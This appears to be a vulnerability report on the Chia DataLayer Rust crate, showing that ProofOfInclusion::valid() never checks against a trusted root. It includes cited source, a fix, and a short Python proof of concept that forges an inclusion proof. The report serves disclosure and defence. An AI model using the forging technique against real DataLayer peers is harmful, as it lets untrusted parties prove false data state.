### Title
`ProofOfInclusion::valid()` Does Not Verify Against a Trusted Root Hash, Allowing Forged Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer Merkle implementation only checks the internal self-consistency of a proof's hash chain. It never compares the computed root against any externally trusted root hash. Because the final comparison `existing_hash == self.root_hash()` is a tautology (both sides resolve to the same field of the struct), any attacker who can supply a `ProofOfInclusion` object with internally consistent hashes will pass validation regardless of whether the claimed leaf is actually present in the committed tree.

### Finding Description

`ProofOfInclusion::valid()` is implemented as follows:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;
    }

    existing_hash == self.root_hash()   // ← tautology
}
``` [1](#0-0) 

`root_hash()` is defined as:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← same field written by the loop
    } else {
        self.node_hash
    }
}
``` [2](#0-1) 

After the loop completes without returning `false`, `existing_hash` holds the last `calculated_hash`. Because the loop already asserted `calculated_hash == layer.combined_hash` for every layer, `existing_hash` is identical to `self.layers.last().combined_hash`. `self.root_hash()` returns exactly that same field. The final comparison is therefore always `true` once the loop finishes — it adds no security.

The function is exposed to Python via `py_valid()` and the struct is fully deserializable from untrusted bytes via `from_bytes` / `from_bytes_unchecked` / `parse_rust`: [3](#0-2) [4](#0-3) 

The struct is registered in the Python wheel's datalayer submodule: [5](#0-4) 

Every test and fuzz target that exercises `valid()` generates the proof from the same trusted `MerkleBlob` and never supplies an external trusted root to compare against, so the tautology is never caught: [6](#0-5) [7](#0-6) 

### Impact Explanation

Any caller that receives a `ProofOfInclusion` from an untrusted source (e.g., a DataLayer peer), deserializes it with `ProofOfInclusion.from_bytes(data)`, and calls `proof.valid()` to decide whether a key-value pair is committed to a known tree root will accept a completely fabricated proof. The attacker constructs any leaf hash and any chain of internally consistent `ProofOfInclusionLayer` values (each `combined_hash` is the hash of the previous hash and the supplied `other_hash`). `valid()` returns `True`. The caller is never told that `root_hash()` must be separately compared against a locally trusted root. This lets untrusted input prove invalid state — a forged inclusion proof for a key-value pair that was never inserted into the tree.

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."**

### Likelihood Explanation

The API surface is misleading by design: `valid()` sounds like a complete validity predicate. The Python type stub exposes both `valid()` and `root_hash()` as separate methods with no documentation indicating that `valid()` alone is insufficient. All internal tests call only `proof.valid()` without a trusted-root comparison, reinforcing the incorrect usage pattern. Any DataLayer client that follows the test examples will be vulnerable.

### Recommendation

`valid()` must accept a trusted root hash parameter and compare against it:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }

    &existing_hash == trusted_root   // compare against externally supplied root
}
```

The no-argument `valid()` should either be removed or clearly documented as a self-consistency check only, not a security check. The Python binding should expose `valid_against_root(trusted_root: bytes32) -> bool` and all callers updated accordingly. Tests should be updated to supply a trusted root obtained independently of the proof object.

### Proof of Concept

```python
from chia_rs.datalayer import (
    ProofOfInclusion, ProofOfInclusionLayer, MerkleBlob, KeyId, ValueId
)
from chia_rs.sized_bytes import bytes32
import hashlib

# Attacker fabricates a proof for a leaf that was never inserted.
fake_leaf_hash = bytes32(b'\xab' * 32)
fake_other_hash = bytes32(b'\xcd' * 32)

# Compute a combined_hash that is internally consistent with the layer.
# calculate_internal_hash(fake_leaf_hash, side, fake_other_hash) → combined
# (exact hash depends on Side ordering; attacker can compute it offline)
# For a single-layer proof the combined_hash IS the claimed root.
import struct

def calculate_internal_hash(left, right):
    h = hashlib.sha256()
    h.update(b'\x02')  # MIDDLE prefix used by chia DataLayer
    h.update(left)
    h.update(right)
    return bytes32(h.digest())

combined = calculate_internal_hash(fake_leaf_hash, fake_other_hash)

layer = ProofOfInclusionLayer(
    other_hash_side=1,          # Right
    other_hash=fake_other_hash,
    combined_hash=combined,
)
forged_proof = ProofOfInclusion(node_hash=fake_leaf_hash, layers=[layer])

# valid() returns True even though this leaf was never in any real tree.
assert forged_proof.valid(), "Expected True — tautology passes"
print("Forged proof accepted by valid():", forged_proof.valid())
print("Claimed root:", forged_proof.root_hash().hex())
# A caller that only checks proof.valid() is deceived.
``` [1](#0-0)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L61-72)
```rust
#[cfg(feature = "py-bindings")]
#[pymethods]
impl ProofOfInclusion {
    #[pyo3(name = "root_hash")]
    pub fn py_root_hash(&self) -> Hash {
        self.root_hash()
    }
    #[pyo3(name = "valid")]
    pub fn py_valid(&self) -> bool {
        self.valid()
    }
}
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L115-124)
```rust
            for kv_id in keys_values.keys().copied() {
                let proof_of_inclusion = match merkle_blob.get_proof_of_inclusion(kv_id) {
                    Ok(proof_of_inclusion) => proof_of_inclusion,
                    Err(error) => {
                        open_dot(merkle_blob.to_dot().unwrap().set_note(&error.to_string()));
                        panic!("here");
                    }
                };
                assert!(proof_of_inclusion.valid());
            }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** wheel/src/api.rs (L1052-1053)
```rust
    datalayer.add_class::<ProofOfInclusionLayer>()?;
    datalayer.add_class::<ProofOfInclusion>()?;
```

**File:** crates/chia-datalayer/fuzz/fuzz_targets/proofs_of_inclusion.rs (L28-31)
```rust
    for key in keys {
        let proof = blob.get_proof_of_inclusion(key).unwrap();
        assert!(proof.valid());
    }
```
